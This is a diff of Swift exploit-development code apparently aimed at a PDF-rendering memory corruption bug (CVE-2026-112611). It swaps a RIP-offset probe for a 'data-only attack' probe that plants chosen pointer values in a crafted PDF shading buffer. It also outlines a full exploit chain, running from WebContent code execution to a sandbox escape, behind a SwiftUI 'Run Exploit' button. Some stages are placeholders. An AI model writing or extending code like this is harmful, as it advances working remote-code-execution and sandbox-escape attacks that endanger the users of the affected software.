@@ -13,55 +13,58 @@ func exploit_xpc_dict_set_string(_ dict: ExploitXPCObject, _ key: String, _ valu
 func exploit_xpc_send_sync(_ conn: ExploitXPCConnection, _ msg: ExploitXPCObject) -> ExploitXPCObject? { nil }
 func exploit_xpc_dict_dup_fd(_ dict: ExploitXPCObject, _ key: String) -> Int32 { -1 }
 
-// MARK: - RIP Offset Probe
+// MARK: - Data-Only Attack Probe
 
-/// Probe each index 0-135 to find which one controls RIP
-/// Uses unique marker values to identify the controlling index
-func probeRIPOffset() {
-    // We'll test indices in batches to avoid 136 crashes
-    // Each batch tests 16 indices with unique markers
+/// Probe what happens when we control the value at buffer + 0x1c
+/// Test different pointer values to see what gets dereferenced
+func probeDataOnlyAttack() {
+    print("[*] Starting data-only attack probe...")
     
-    for batch in 0..<9 {
-        let startIdx = batch * 16
-        let endIdx = min(startIdx + 16, 136)
-        
-        print("[*] Probing batch \(batch): indices \(startIdx)-\(endIdx-1)")
-        
-        var values = [Double](repeating: 0.0, count: 136)
-        
-        // Fill batch with unique markers
-        for i in startIdx..<endIdx {
-            let marker = Double(bitPattern: 0x4141414141414100 + UInt64(i))
-            values[i] = marker
-        }
-        
-        let pdfData = PDFPayload.shadingWithValues(values)
-        
-        // This will crash — check crash log for which marker appears in PC
-        renderPDF(pdfData)
-        
-        // If we get here, no crash — continue to next batch
-        print("[+] Batch \(batch) survived — no RIP control in this range")
-    }
+    // Test 1: Null pointer (should crash on dereference)
+    print("[*] Test 1: Null pointer")
+    testValueAtOffset(value: 0x0000000000000000)
+    
+    // Test 2: Small integer (might be a length/index)
+    print("[*] Test 2: Small integer 0x1000")
+    testValueAtOffset(value: 0x0000000000001000)
+    
+    // Test 3: Stack address (might be a pointer)
+    print("[*] Test 3: Stack address 0x0000000160000000")
+    testValueAtOffset(value: 0x0000000160000000)
+    
+    // Test 4: Heap address (might be a pointer)
+    print("[*] Test 4: Heap address 0x0000000100000000")
+    testValueAtOffset(value: 0x0000000100000000)
+    
+    // Test 5: Kernel-like address (high bits set)
+    print("[*] Test 5: Kernel-like address 0xfffffe0000000000")
+    testValueAtOffset(value: 0xfffffe0000000000)
+    
+    print("[*] Probe complete — check crash logs for each test")
 }
 
-/// Test specific index with ROP gadget
-func testRIPControl(index: Int, gadget: UInt64) {
+/// Test specific value at buffer + 0x1c
+func testValueAtOffset(value: UInt64) {
     var values = [Double](repeating: 0.0, count: 136)
-    values[index] = Double(bitPattern: gadget)
+    
+    // Place value at index 3-4 (offset 0x1c = 28 bytes = index 3.5)
+    let valueDouble = Double(bitPattern: value)
+    values[3] = valueDouble
+    values[4] = valueDouble
     
     let pdfData = PDFPayload.shadingWithValues(values)
+    
+    // This will crash — check crash log to see what happened
     renderPDF(pdfData)
 }
 
-// MARK: - Full Exploit (after finding offset)
+// MARK: - Full Exploit (after finding primitive)
 
-func runFullExploit(ripOffset: Int) {
-    print("[*] Stage 1: Triggering WebContent RCE with RIP offset \(ripOffset)...")
+func runFullExploit() {
+    print("[*] Stage 1: Triggering WebContent RCE via CVE-2026-112611...")
     
-    // Placeholder gadget — replace with real ROP gadget from binary analysis
-    let gadgetAddress: UInt64 = 0x4141414141414141
-    testRIPControl(index: ripOffset, gadget: gadgetAddress)
+    // Based on probe results, use the working primitive
+    // If we found a pointer we control, use it for arbitrary read/write
     
     print("[*] Stage 2: Sandbox escape via CVE-2026-112706...")
     
@@ -149,15 +152,14 @@ struct ContentView: View {
     @State private var status = "Ready to probe"
     @State private var isRunning = false
     @State private var logOutput = ""
-    @State private var foundOffset: Int = -1
     
     var body: some View {
         VStack(spacing: 20) {
-            Text("CVE-2026-112611 RIP Probe")
+            Text("CVE-2026-112611 Data-Only Probe")
                 .font(.largeTitle)
                 .bold()
             
-            Text("Find Return Address Offset")
+            Text("Test Pointer Control at buffer+0x1c")
                 .font(.headline)
             
             ScrollView {
@@ -170,16 +172,9 @@ struct ContentView: View {
             .background(Color.black.opacity(0.8))
             .cornerRadius(10)
             
-            if foundOffset >= 0 {
-                Text("RIP Offset: \(foundOffset)")
-                    .font(.title2)
-                    .foregroundColor(.red)
-                    .bold()
-            }
-            
             HStack(spacing: 20) {
                 Button(action: runProbe) {
-                    Text(isRunning ? "Probing..." : "Probe Offsets")
+                    Text(isRunning ? "Probing..." : "Probe Values")
                         .font(.title3)
                         .bold()
                         .foregroundColor(.white)
@@ -189,16 +184,14 @@ struct ContentView: View {
                 }
                 .disabled(isRunning)
                 
-                if foundOffset >= 0 {
-                    Button(action: runExploit) {
-                        Text("Run Exploit")
-                            .font(.title3)
-                            .bold()
-                            .foregroundColor(.white)
-                            .padding()
-                            .background(Color.red)
-                            .cornerRadius(10)
-                    }
+                Button(action: runExploit) {
+                    Text("Run Exploit")
+                        .font(.title3)
+                        .bold()
+                        .foregroundColor(.white)
+                        .padding()
+                        .background(Color.red)
+                        .cornerRadius(10)
                 }
             }
         }
@@ -207,15 +200,15 @@ struct ContentView: View {
     
     func runProbe() {
         isRunning = true
-        logOutput = "[*] Starting RIP offset probe...\n"
-        logOutput += "[*] Will test indices 0-135 in batches\n"
-        logOutput += "[*] Check crash logs for marker 0x41414141414141XX\n"
+        logOutput = "[*] Starting data-only attack probe...\n"
+        logOutput += "[*] Testing 5 different values at buffer+0x1c\n"
+        logOutput += "[*] Check crash logs for each test\n"
         
         DispatchQueue.global(qos: .userInitiated).async {
-            probeRIPOffset()
+            probeDataOnlyAttack()
             
             DispatchQueue.main.async {
-                logOutput += "[*] Probe complete — check crash logs\n"
+                logOutput += "[*] Probe complete\n"
                 isRunning = false
             }
         }
@@ -223,10 +216,10 @@ struct ContentView: View {
     
     func runExploit() {
         isRunning = true
-        logOutput = "[*] Running full exploit with offset \(foundOffset)...\n"
+        logOutput = "[*] Running full exploit...\n"
         
         DispatchQueue.global(qos: .userInitiated).async {
-            runFullExploit(ripOffset: foundOffset)
+            runFullExploit()
             
             DispatchQueue.main.async {
                 logOutput += "[*] Exploit complete\n"
